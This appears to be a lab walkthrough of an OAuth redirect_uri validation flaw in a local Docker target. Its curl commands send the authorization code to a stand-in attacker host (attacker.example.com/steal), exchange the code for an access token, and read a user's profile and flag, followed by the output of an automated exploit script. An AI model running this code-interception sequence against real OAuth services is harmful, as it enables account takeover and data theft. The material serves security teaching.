# Walkthrough: OAuth Vulnerabilities

## Setup

```bash
docker compose up --build -d
```

## Step 1: Confirm the Vulnerability

Send an authorization request with a registered URI, then with an attacker URI:

```bash
# Registered URI: works
curl -X POST -H 'Content-Type: application/json' \
  -d '{"client_id":"app","redirect_uri":"http://localhost:8080/callback","state":"s1","allow":true}' \
  http://localhost:8080/oauth/authorize
```

```bash
# Attacker URI: also works (the bug)
curl -X POST -H 'Content-Type: application/json' \
  -d '{"client_id":"app","redirect_uri":"http://attacker.example.com/steal","state":"s2","allow":true}' \
  http://localhost:8080/oauth/authorize
```

Output (second request):

```json
{
  "code": "a3f8c2d1e9b04f76a3f8c2d1e9b04f76",
  "redirect_to": "http://attacker.example.com/steal?code=a3f8c2d1e9b04f76a3f8c2d1e9b04f76&state=s2",
  "note": "Server redirects victim to redirect_uri with the auth code"
}
```

## Step 2: Exchange the Code

```bash
curl -X POST -H 'Content-Type: application/json' \
  -d '{
    "grant_type":"authorization_code",
    "code":"a3f8c2d1e9b04f76a3f8c2d1e9b04f76",
    "redirect_uri":"http://attacker.example.com/steal",
    "client_id":"app",
    "client_secret":"client_secret_app"
  }' \
  http://localhost:8080/oauth/token
```

Output:

```json
{
  "access_token": "1b2c3d4e5f6a7b8c1b2c3d4e5f6a7b8c1b2c3d4e5f6a7b8c1b2c3d4e5f6a7b8c",
  "token_type": "Bearer",
  "scope": "read"
}
```

## Step 3: Read the Flag

```bash
curl -H "Authorization: Bearer 1b2c3d4e5f6a7b8c..." http://localhost:8080/api/me
```

Output:

```json
{
  "user": "alice",
  "email": "alice@example.com",
  "flag": "POC{a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4}"
}
```

## Automated Exploit

```bash
python3 exploit/exploit.py http://localhost:8080
```

Output:

```
[*] Target: http://localhost:8080

[*] Step 1 -- initiating authorization with malicious redirect_uri
    redirect_uri: http://attacker.example.com/steal
[+] Server accepted attacker redirect_uri
[+] Auth code intercepted: a3f8c2d1...
[+] Would redirect to: http://attacker.example.com/steal?code=a3f8c2d1...

[*] Step 2 -- exchanging intercepted code for access token
[+] Access token: 1b2c3d4e5f6a7b8c...

[*] Step 3 -- fetching protected resource with stolen token
[+] User: alice (alice@example.com)

[+] Flag: POC{a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4}
```
